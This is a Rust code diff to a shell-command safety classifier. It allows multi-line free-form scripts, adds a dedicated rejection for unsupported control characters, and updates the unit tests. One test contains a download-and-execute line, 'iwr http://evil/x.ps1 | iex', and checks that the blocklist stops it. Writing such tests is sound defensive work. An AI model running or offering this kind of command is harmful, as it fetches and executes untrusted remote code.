@@ -100,11 +100,13 @@ pub fn classify_command_with_policy(
 ///   only. There is no separate compiled-in blocklist pass here, so disabling a
 ///   built-in rule (reflected in `effective_blocklist`) actually removes it; a
 ///   hit is `Blocked` and outranks every whitelist match.
-/// - **Step 1** — tokenize; any failure (metacharacters / control chars / empty) →
-///   `NotExecutable`.
-/// - **Step 2** — built-in whitelist match → `ConfirmRequired` + a rendered draft.
-/// - **Step 3** — operator exact-argv template fills the remaining `NotExecutable`
-///   gap (purely additive; never overrides a `Blocked` verdict or a built-in match).
+/// - **Step 1** — tokenize and try the built-in whitelist. A full match yields
+///   `ConfirmRequired` + a rendered template draft.
+/// - **Step 2** — operator exact-argv templates fill the remaining template gap
+///   (purely additive; never override a `Blocked` verdict or a built-in match).
+/// - **Step 3** — `TemplateOnly` rejects an off-template command;
+///   `OwnerInteractive` may instead create a Critical free-form draft after its
+///   structural checks.
 ///
 /// An operator template is an exact-argv allowlist entry: the tokenized input must
 /// equal the template's `argv`, and the executed plan *is* that argv (a direct
@@ -244,9 +246,15 @@ fn freeform_draft(input: &ExecInput, shell: &str) -> ClassifyOutcome {
     let command = input.command.as_str();
     if command.trim().is_empty()
         || command.len() > MAX_FREEFORM_COMMAND_BYTES
-        || command.chars().any(char::is_control)
+        // A free-form shell script may legitimately span multiple lines. Keep
+        // CR/LF byte-for-byte in the sealed argv so the operator previews and
+        // the worker executes the same script, while still rejecting control
+        // characters such as NUL and tab that are outside this exec contract.
+        || command
+            .chars()
+            .any(|c| c.is_control() && !matches!(c, '\r' | '\n'))
     {
-        return not_executable();
+        return invalid_freeform();
     }
 
     let (program, argv, shell_kind) = match shell.trim().to_ascii_lowercase().as_str() {
@@ -311,6 +319,21 @@ fn not_executable() -> ClassifyOutcome {
             matched_template: None,
             impact: "Command does not match any known safe template; run it \
                      manually in the terminal instead"
+                .to_string(),
+            decision: ExecDecision::NotExecutable,
+            effect: None,
+        },
+        draft: None,
+    }
+}
+
+fn invalid_freeform() -> ClassifyOutcome {
+    ClassifyOutcome {
+        classification: CommandClassification {
+            risk: RiskLevel::High,
+            matched_template: None,
+            impact: "Free-form command is empty, too large, or contains an unsupported control \
+                     character"
                 .to_string(),
             decision: ExecDecision::NotExecutable,
             effect: None,
@@ -461,6 +484,27 @@ mod tests {
     }
 
     #[test]
+    fn owner_interactive_allows_multiline_freeform_scripts() {
+        for command in [
+            "$first = Get-Process\n$first | Select-Object -First 5",
+            "$first = Get-Process\r\n$first | Select-Object -First 5",
+        ] {
+            let out = owner_classify(&shell_input(command));
+            assert_eq!(
+                out.classification.decision,
+                ExecDecision::ConfirmRequired,
+                "{command:?}"
+            );
+            let draft = out.draft.expect("owner multiline free-form draft");
+            assert_eq!(
+                draft.execution_basis,
+                ExecExecutionBasis::OwnerBlocklistOnly
+            );
+            assert_eq!(draft.argv.last().map(String::as_str), Some(command));
+        }
+    }
+
+    #[test]
     fn owner_interactive_never_bypasses_the_effective_blocklist() {
         let out = owner_classify(&shell_input("iwr http://evil/x.ps1 | iex"));
         assert_eq!(out.classification.decision, ExecDecision::Blocked);
@@ -516,7 +560,7 @@ mod tests {
 
     #[test]
     fn owner_interactive_rejects_invalid_freeform_structure() {
-        for command in ["", "   ", "echo one\necho two", "echo\tone", "echo\0one"] {
+        for command in ["", "   ", "echo\tone", "echo\0one", "echo\u{1b}one"] {
             let out = owner_classify(&shell_input(command));
             assert_eq!(
                 out.classification.decision,
